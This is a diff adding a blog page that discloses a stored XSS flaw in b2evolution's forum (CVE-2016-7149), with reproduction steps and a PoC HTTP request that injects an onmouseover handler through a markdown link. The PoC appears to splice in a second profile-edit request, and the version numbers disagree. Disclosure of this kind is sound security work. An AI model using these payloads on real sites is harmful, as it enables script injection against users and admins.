@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      B2evolution v6.4.7 forum XSS [CVE-2016-7149] &middot; 储藏间
+    
+  </title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/blog/public/css/poole.css">
+  <link rel="stylesheet" href="/blog/public/css/syntax.css">
+  <link rel="stylesheet" href="/blog/public/css/hyde.css">
+  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+
+  <!-- Icons -->
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/blog/public/apple-touch-icon-144-precomposed.png">
+                                 <link rel="shortcut icon" href="/blog/public/favicon.ico">
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/blog/atom.xml">
+</head>
+
+
+  <body>
+
+    <div class="sidebar">
+  <div class="container sidebar-sticky">
+    <div class="sidebar-about">
+      <h1>
+        <a href="/blog/">
+          储藏间
+        </a>
+      </h1>
+      <p class="lead">是个用来放洞的储藏间</p>
+    </div>
+
+    <nav class="sidebar-nav">
+      <a class="sidebar-nav-item" href="/blog/">Home</a>
+
+      
+
+      
+      
+        
+          
+        
+      
+        
+          
+            <a class="sidebar-nav-item" href="/blog//about/">About</a>
+          
+        
+      
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+
+      <!--
+      <a class="sidebar-nav-item" href="/archive/v2.1.0.zip">Download</a>
+      <a class="sidebar-nav-item" href="">GitHub project</a>
+      !-->
+      <span class="sidebar-nav-item">Currently v2.1.0</span>
+    </nav>
+
+    <p>&copy; 2017. All rights reserved.</p>
+  </div>
+</div>
+
+
+    <div class="content container">
+      <div class="post">
+  <h1 class="post-title">B2evolution v6.4.7 forum XSS [CVE-2016-7149]</h1>
+  <span class="post-date">29 Dec 2016</span>
+  <p>发现者: 陈瑞琦</p>
+
+<p>发现日期: 2016-08-11</p>
+
+<p>下载地址: <a href="http://b2evolution.net/downloads/">b2evolution</a></p>
+
+<p>作者: b2evolution.net</p>
+
+<p>作者通知日期: 2016-08-11</p>
+
+<p>作者联系手段: http://b2evolution.net/?disp=msgform</p>
+
+<p>CVE-ID：CVE-2016-7149</p>
+
+<p><strong>描述:</strong></p>
+
+<p>b2evolutioe is a content and community management system written in PHP and backed by a MySQL database. It is distributed as free software under the GNU General Public License.
+b2evolution originally started as a multi-user multi-blog engine when Fran?ois Planque forked b2evolution from version 0.6.1 of b2/cafelog in 2003.[2] A more widely known fork of b2/cafelog is WordPress. b2evolution is available in web host control panels as a “one click install” web app.<a href="Wiki">3</a></p>
+
+<p><strong>细节:</strong></p>
+
+<p>B2evolutioes stored XSS in b2evolution version 6.7.5</p>
+
+<p>Any user can post a forum with some evil code in it.</p>
+
+<p>And when the admin see the forum, the page is lack of filter to protect the admin.</p>
+
+<p>Step 1 : Register a user of the web-site, active the user by mail.</p>
+
+<p>Step 2 : Post a forum with some thing like</p>
+<pre><code>
+[test_forum_xss](http://test.forum.xss"onmouseover="alert(1)"on="1 "test_forum_xss")
+</code></pre>
+<p>Step 3 : Save the changes</p>
+
+<p>Step 4 : Any user view the forum, when the mouse over the content, the XSS code runs.</p>
+
+<p><strong>PoC:</strong></p>
+
+<p><code class="highlighter-rouge">code</code></p>
+<pre><code>
+POST /b2evolution/htsrv/item_edit.php HTTP/1.1
+Host: 192.168.204.130
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.204.130/b2evolution/index.php/forums/?disp=edit&amp;cat=17
+Cookie: session_b2evo_192_168_204_130=41_UqjtnJWp3oJZWVMtpznHzh4zgKxvBvTR; session_b2evo=87_j6i55FblKwr7rWFbheuTwjRaLbiN6ghM
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 636
+
+post_title=test_forum_xss&amp;content=%5Btest_forum_xss%5D%28http%3A%2F%2Ftest.forum.xss%22onmouseover%3D%22alert%281%29%22on%3D%221+%22test_forum_xss%22%29%0D%0A&amp;renderers_displayed=1&amp;renderers%5B%5D=b2evMark&amp;renderers%5B%5D=b2evWiLi&amp;renderers%5B%5D=b2evGMco&amp;renderers%5B%5D=b2evALnk&amp;renderers%5B%5D=evo_videoplug&amp;renderers%5B%5D=b2WPAutP&amp;post_category=17&amp;post_extracats%5B%5D=17&amp;actionArray%5Bcreate%5D=&amp;crumb_item=IT6Hs70o5KE9J0kgz9nmWNnAhCfW4qeo&amp;ctrl=items&amp;blog=5&amp;post_ID=0&amp;redirect_to=http%3A%2F%2F192.168.204.130%2Fb2evolution%2Findex.php%2Fforums%2F%3Fdisp%3Dedit&amp;preview=0&amp;more=1&amp;preview_userid=8&amp;item_typ_ID=6&amp;post_status=community
+edited_user_login=kevino&amp;edited_user_firstname=kevino&amp;edited_user_lastname=kevino&amp;edited_user_nickname=kevino&amp;edited_user_gender=M&amp;edited_user_ctry_ID=&amp;edited_user_rgn_ID=&amp;edited_user_subrg_ID=&amp;edited_user_city_ID=&amp;edited_user_age_min=&amp;edited_user_age_max=&amp;organizations%5B%5D=&amp;uf_38=kevino&amp;uf_39=kevino&amp;uf_40=kevino&amp;uf_41=https%3A%2F%2Ftwitter.com%2Fkevino%22onmouseover%3D%22alert%281%29%22onerror%3D%221&amp;uf_42=https%3A%2F%2Ffacebook.com%2Fkevino&amp;uf_43=http%3A%2F%2Fkevino.net%2Fkevino&amp;new_field_type=3&amp;actionArray%5Bupdate%5D=Save+Changes%21&amp;crumb_user=CQ7LjBDKmMin8zqBDl050nNEbmINmIGi&amp;user_tab=profile&amp;identity_form=1&amp;user_ID=8&amp;blog=1&amp;orig_user_ID=8&amp;12_3=4_56
+
+</code></pre>
+
+<p><strong>Fix:</strong></p>
+
+<p>https://github.com/b2evolution/b2evolution/commit/9a4ab85439d1b838ee7b8eeebbf59174bb787811</p>
+
+</div>
+
+<div class="related">
+  <h2>Related Posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/blog//2017/02/06/Mybb-backup-acp/">
+            Mybb Backup Acp
+            <small>06 Feb 2017</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/blog//2016/12/29/b2evolution-xss-3/">
+            B2evolution v6.4.7 website title XSS [CVE-2016-7150]
+            <small>29 Dec 2016</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/blog//2016/12/28/b2evolution-xss/">
+            B2evolution v6.4.7 XSS [CVE-2016-6821]
+            <small>28 Dec 2016</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+    </div>
+
+  </body>
+</html>
